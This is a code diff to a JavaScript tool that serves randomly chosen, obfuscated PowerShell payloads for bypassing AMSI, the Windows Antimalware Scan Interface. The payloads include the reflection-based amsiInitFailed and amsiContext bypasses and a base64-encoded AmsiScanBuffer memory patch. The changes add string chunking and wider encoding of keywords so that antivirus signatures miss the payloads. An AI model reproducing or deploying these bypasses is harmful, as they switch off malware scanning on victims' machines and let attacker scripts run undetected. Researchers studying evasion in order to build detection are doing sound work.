@@ -62,6 +62,7 @@ async function respond() {
   })
 }
 
+
 /**
  * Responds with an encoded and obfuscated AMSI bypass.
  * @returns {Promise<Response>}
@@ -153,6 +154,26 @@ function obfuscateInt(int){
     return int
 }
 
+
+/*
+* From: https://stackoverflow.com/questions/7033639/split-large-string-in-n-size-chunks-in-javascript
+* Splits a string into N sized chunks
+* @param {String} str, {Int} size 
+* @returns {Array} Chunks of string you split into N (size)
+*/
+function chunkSubstr(str, size) {
+  const numChunks = Math.ceil(str.length / size)
+  const chunks = new Array(numChunks)
+
+  for (let i = 0, o = 0; i < numChunks; ++i, o += size) {
+    chunks[i] = str.substr(o, size)
+  }
+
+  return chunks
+}
+
+
+
 /**
  * Obfuscate a char in 2 different ways (eg "A" => "+[CHAR]41")
  * @param {String} char
@@ -175,7 +196,10 @@ function obfuscateChar(char){
  * @returns {String} the obfuscated string
  */
 function diacriticEncode(input){
-    return [...input].map(c => getRandomDiacritic(c.charCodeAt(0))).join('')
+    let encodedString= [...input].map(c => getRandomDiacritic(c.charCodeAt(0))).join('')
+    let stringSize= randomInt(encodedString.length-2)
+    let encodedArray= chunkSubstr(encodedString,stringSize+1)
+    return encodedArray.join('\'+\'')
 }
 
 /**
@@ -235,7 +259,7 @@ function obfuscateString(input){
             // pattern obfuscate, we use substring(1) to remove the first +    
             let obfuscatedPattern = [...String.raw`\p{Mn}`].map(c => obfuscateChar(c)).join('').substring(1)
 
-            return `+'${diacriticEncode(input)}'.${randomCase("Normalize")}(${obfuscatedFormD}) -replace ${obfuscatedPattern}`
+            return `+('${diacriticEncode(input)}').${randomCase("Normalize")}(${obfuscatedFormD}) -replace ${obfuscatedPattern}`
     }
 }
 
@@ -262,7 +286,10 @@ function encodePayload(input){
         "AmsiUtils",
         "amsiInitFailed",
         "WriteInt32",
-        "System.Management"
+	    "System",
+        "Management",
+        "Automation"
+        
     ]
 
     for (const word of mustEncode){
@@ -339,9 +366,9 @@ function encodeRasta(input){
 function getPayload(){
     let memvar = randomString(3 + randomInt(7));
     const ForceErrer = `#Unknown - Force error \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(${obfuscateInt(9076)});[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\", \"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\", \"NonPublic,Static\").SetValue($null, [IntPtr]$${memvar});`
-    const MattGRefl = "#Matt Graebers Reflection method \n[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField('amsiInitFailed',\"NonPublic,Static\").SetValue($null,$true);";
-    const MattGReflLog = "#Matt Graebers Reflection method with WMF5 autologging bypass \n[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\")),('GetField')).Invoke('amsiInitFailed',((\"NonPublic,Static\") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);";
-    const MattGref02 = `#Matt Graebers second Reflection method \n[Runtime.InteropServices.Marshal]::(\"WriteInt32\")([Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\",[Reflection.BindingFlags]\"NonPublic,Static\").GetValue($null),0x${randomInt(2147483647).toString(16)});`
+    const MattGRefl = `#Matt Graebers Reflection method \n$${memvar}=\"System.Management.Automation.AmsiUtils\";[Ref].Assembly.GetType($${memvar}).GetField('amsiInitFailed',\"NonPublic,Static\").SetValue($null,$true);`;
+    const MattGReflLog = `#Matt Graebers Reflection method with WMF5 autologging bypass \n$${memvar}=\"System.Management.Automation.AmsiUtils\";[Delegate]::CreateDelegate((\"Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType($${memvar})),('GetField')).Invoke('amsiInitFailed',((\"NonPublic,Static\") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);`;
+    const MattGref02 = `#Matt Graebers second Reflection method \n$${memvar}=\"System.Management.Automation.AmsiUtils\";[Runtime.InteropServices.Marshal]::(\"WriteInt32\")([Ref].Assembly.GetType($${memvar}).GetField(\"amsiContext\",[Reflection.BindingFlags]\"NonPublic,Static\").GetValue($null),0x${randomInt(2147483647).toString(16)});`
     const RastaBuf = atob("I1Jhc3RhLW1vdXNlcyBBbXNpLVNjYW4tQnVmZmVyIHBhdGNoIFxuDQokV2luMzIgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIFdpbjMyIHsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KfQ0KIkANCg0KQWRkLVR5cGUgJFdpbjMyDQoNCiRMaWJMb2FkID0gW1dpbjMyXTo6TG9hZExpYnJhcnkoImFtc2kuZGxsIikNCiRNZW1BZHIgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTGliTG9hZCwgIkFtc2lTY2FuQnVmZmVyIikNCiRwID0gMA0KW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJE1lbUFkciwgW3VpbnQzMl01LCAweDQwLCBbcmVmXSRwKQ0KJHZhcjEgPSAiMHhCOCINCiR2YXIyID0gIjB4NTciDQokdmFyMyA9ICIweDAwIg0KJHZhcjQgPSAiMHgwNyINCiR2YXI1ID0gIjB4ODAiDQokdmFyNiA9ICIweEMzIg0KJFBhdGNoID0gW0J5dGVbXV0gKCR2YXIxLCR2YXIyLCR2YXIzLCR2YXI0LCskdmFyNSwrJHZhcjYpDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJE1lbUFkciwgNik=");
 
     switch (randomInt(5)) {
@@ -357,3 +384,4 @@ function getPayload(){
             return encodeRasta(RastaBuf)
     }
 }
+
